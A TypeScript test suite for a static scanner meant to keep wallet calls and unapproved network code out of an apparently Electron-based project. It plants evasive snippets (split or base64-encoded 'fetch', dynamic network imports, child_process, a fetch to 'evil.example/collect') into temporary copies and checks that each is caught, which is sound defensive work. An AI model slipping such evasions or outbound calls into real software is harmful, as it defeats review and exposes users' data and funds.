/**
 * BSV v1 review fix F2: the tripwire covers ALL of src/ and ui/src, not just src/core/bsv and the files that register tools.
 * Every case here is a way the review got a wallet call past the old scan; each is planted in a temp copy and must be caught.
 * A static scan cannot stop code that is determined to hide (see docs/BSV-MODE.md); these tests pin what it DOES stop.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { ALLOWLIST, joinLiterals, lex, scanTree } from './bsv-scan.js';

const REPO = fileURLToPath(new URL('../../', import.meta.url));

/** A copy of the scanned trees (sources only) in a temp root, so a planted file never touches the repo. */
function copyTrees(): string {
  const root = mkdtempSync(join(tmpdir(), 'legion-tripwire-'));
  for (const d of ['src', 'ui/src']) {
    cpSync(join(REPO, d), join(root, d), { recursive: true, filter: (p) => !/\.(json|jsonl|png|svg|woff2?|ttf|css|md)$/.test(p) });
  }
  return root;
}
const plant = (root: string, file: string, text: string, mode: 'append' | 'create' = 'append') => {
  const p = join(root, file);
  if (mode === 'create') { mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, text); return () => undefined; }
  const before = readFileSync(p, 'utf8');
  writeFileSync(p, before + '\n' + text + '\n');
  return () => writeFileSync(p, before);
};

test('F2: the untouched tree is clean, the scan covers src and ui/src, and the allowlist has no dead entries', () => {
  const r = scanTree(REPO);
  assert.deepEqual(r.violations, []);
  assert.ok(r.files.some((f) => f.startsWith('src/core/comms/')), 'comms is scanned');
  assert.ok(r.files.some((f) => f.startsWith('src/core/kg/')), 'kg is scanned');
  assert.ok(r.files.some((f) => f.startsWith('ui/src/')), 'ui/src is scanned');
  assert.ok(r.files.some((f) => f.startsWith('src/bin/')) && r.files.some((f) => f.startsWith('src/electron/')), 'bin and electron are scanned');
  assert.ok(r.files.length > 100, `files scanned: ${r.files.length}`);
  assert.ok(r.toolNames.length >= 25, `tool names found: ${r.toolNames.length}`);
  for (const known of ['legion_run', 'legion_vm', 'kg_recall', 'kg_search', 'bot_send', 'room_post']) assert.ok(r.toolNames.includes(known), `scan did not see tool ${known}`);
  for (const [file, e] of Object.entries(ALLOWLIST)) {
    assert.ok(existsSync(join(REPO, file)), `allowlisted file ${file} does not exist`);
    assert.ok(e.reason.length > 20, `${file}: the allowlist entry needs a real reason`);
    for (const k of e.kinds) assert.ok(r.matchedAllow.includes(`${file}#${k}`), `${file} no longer needs the "${k}" allowance: remove it`);
  }
});

const CASES: Array<{ name: string; file: string; text: string; mode?: 'create'; expect: RegExp }> = [
  // the review's own plants
  { name: 'a new core file that fetches the wallet port and names WalletClient', file: 'src/core/walletbridge.ts', mode: 'create', expect: /3321|WalletClient|network/i,
    text: "export class WalletClient { async v() { return fetch('http://127.0.0.1:3321/getVersion'); } }\n" },
  { name: '3321 in comms/hub.ts', file: 'src/core/comms/hub.ts', text: "const PORT = '3321';", expect: /3321/ },
  { name: '3321 in kg/graph.ts', file: 'src/core/kg/graph.ts', text: '// wallet on 3321', expect: /3321/ },
  { name: 'fetch to /createAction in the UI', file: 'ui/src/bsv/bsvStore.ts', text: "void fetch('http://127.0.0.1:3321/createAction', { method: 'POST' });", expect: /3321|createAction|network/i },
  // evasions inside src/core/bsv
  { name: "globalThis['fe'+'tch']", file: 'src/core/bsv/state.ts', text: "const f = globalThis['fe' + 'tch'];", expect: /network|global|fetch/i },
  { name: 'an alias: const f = fetch', file: 'src/core/bsv/state.ts', text: 'const f = fetch; void f;', expect: /network/i },
  { name: "dynamic import of node:https", file: 'src/core/bsv/state.ts', text: "async function g() { return (await import('node:https')).get; }", expect: /network|import/i },
  { name: "'Wallet' + 'Client'", file: 'src/core/bsv/state.ts', text: "const n = 'Wallet' + 'Client';", expect: /WalletClient/i },
  { name: "['Wallet','Client'].join('')", file: 'src/core/bsv/state.ts', text: "const n = ['Wallet', 'Client'].join('');", expect: /WalletClient/i },
  { name: "'3' + '321'", file: 'src/core/bsv/state.ts', text: "const p = '3' + '321';", expect: /3321/ },
  { name: 'a template-literal split of createAction', file: 'src/core/bsv/state.ts', text: "const a = `create${'Action'}`;", expect: /createAction/i },
  { name: 'a tool name built with join()', file: 'src/core/mcp-tools.ts', text: "server.registerTool(['legion', 'wallet', 'spend'].join('_'), {}, async () => ({}));", expect: /tool name/i },
  { name: 'a tool name built from a template', file: 'src/core/kg/tools.ts', text: 'server.registerTool(`kg_${kind}`, {}, async () => ({}));', expect: /tool name/i },
  { name: 'a wallet-shaped literal tool name', file: 'src/core/mcp-tools.ts', text: "server.registerTool('legion_wallet_spend', {}, async () => ({}));", expect: /wallet-like tool name/ },
  // outbound code outside the allowlist
  { name: 'node:http in a new file', file: 'src/core/newnet.ts', mode: 'create', text: "import http from 'node:http';\nexport const g = http.get;\n", expect: /inbound-http|network|node:http/i },
  { name: 'node:net in a new file', file: 'src/core/newnet2.ts', mode: 'create', text: "import { connect } from 'node:net';\nexport const c = connect;\n", expect: /network|node:net/i },
  { name: 'fetch in a new comms file', file: 'src/core/comms/ping.ts', mode: 'create', text: "export const ping = () => fetch('https://example.org');\n", expect: /network/i },
  { name: 'a WebSocket in the UI', file: 'ui/src/graph/live.ts', mode: 'create', text: "export const s = new WebSocket('ws://example.org');\n", expect: /network/i },
  { name: 'child_process in a new file', file: 'src/core/shell.ts', mode: 'create', text: "import { execFile } from 'node:child_process';\nexport const x = execFile;\n", expect: /child-process|child_process/i },
  { name: 'base64 decoding to hide a token', file: 'src/core/bsv/types.ts', text: "const t = Buffer.from('Y3JlYXRlQWN0aW9u', 'base64').toString();", expect: /decod/i },
  { name: 'String.fromCharCode to build a name', file: 'src/core/bsv/types.ts', text: 'const t = String.fromCharCode(102, 101, 116, 99, 104);', expect: /decod/i },
  // an allowlisted file may do its one job, nothing else
  { name: 'WalletClient inside an allowlisted file', file: 'src/electron/main.ts', text: '// WalletClient', expect: /WalletClient/i },
  { name: 'a non-loopback URL inside an allowlisted network file', file: 'src/bin/legion-mcp-stdio.ts', text: "void fetch('https://evil.example/collect');", expect: /loopback|host/i },
  { name: 'node:net inside an allowlisted file that is only allowed fetch', file: 'src/core/boat.ts', text: "import { connect } from 'node:net'; void connect;", expect: /network|node:net/i },
];

for (const c of CASES) {
  test(`F2 plant: ${c.name} is caught`, () => {
    const root = copyTrees();
    assert.deepEqual(scanTree(root).violations, [], 'the copy is clean before planting');
    plant(root, c.file, c.text, c.mode ?? 'append');
    const v = scanTree(root).violations;
    assert.ok(v.some((x) => x.includes(c.file) && c.expect.test(x)), `not caught: ${c.name}\nviolations: ${JSON.stringify(v)}`);
  });
}

test('F2: the word-shaped tool-name rule no longer trips on "alarm", "design" or "payload", but still on real wallet words', () => {
  const root = copyTrees();
  const undo = plant(root, 'src/core/mcp-tools.ts', "server.registerTool('legion_alarm_design', {}, async () => ({}));\nserver.registerTool('legion_payload_assign', {}, async () => ({}));");
  assert.deepEqual(scanTree(root).violations, []);
  undo();
  for (const bad of ['legion_pay', 'legion_sign_tx', 'wallet_status', 'legion_arm', 'bsv_send', 'legion_broadcast', 'legion_freeze']) {
    const u = plant(root, 'src/core/mcp-tools.ts', `server.registerTool('${bad}', {}, async () => ({}));`);
    assert.ok(scanTree(root).violations.some((x) => /wallet-like tool name/.test(x)), bad);
    u();
  }
});

test('F2: a legitimate new network user fails until it is added to the allowlist with a reason (fail on any new file)', () => {
  const root = copyTrees();
  plant(root, 'src/core/telemetry.ts', "export const send = () => fetch('http://127.0.0.1:1/x');\n", 'create');
  const v = scanTree(root).violations;
  assert.ok(v.some((x) => x.includes('src/core/telemetry.ts')));
  assert.deepEqual(scanTree(root, { ...ALLOWLIST, 'src/core/telemetry.ts': { kinds: ['fetch'], reason: 'test: a deliberately allowed loopback probe' } }).violations, []);
});

test('F2: the lexer the scan stands on: comments never hide code, strings never fake it, template code and regex bodies are handled', () => {
  // a // inside a string does not start a comment (the old regex cut the rest of the line here)
  assert.match(lex("const u = 'a // b'; fetch(u);").code, /\bfetch\b/);
  // a comment is not code
  assert.doesNotMatch(lex('// fetch(x)\n/* fetch(y) */ const a = 1;').code, /fetch/);
  // a word inside a string is not code, but is kept for the string rules
  const s = lex("const m = 'call fetch later';");
  assert.doesNotMatch(s.code, /fetch/);
  assert.match(s.kept, /call fetch later/);
  // code inside a template substitution IS code
  assert.match(lex('const x = `a ${fetch(u)} b`;').code, /\bfetch\b/);
  // a regex with quote characters does not swallow the code after it
  assert.match(lex("const r = /['\"`]/g; fetch(u);").code, /\bfetch\b/);
  assert.match(lex('const r = a / b; fetch(u); const q = c / d;').code, /\bfetch\b/);
  // joining
  assert.match(joinLiterals("'Wal' + 'let' + `Cli${'ent'}`"), /WalletClient/);
  assert.match(joinLiterals("['re', 'ta', 'etc'].reverse().join('')"), /etc/);
});
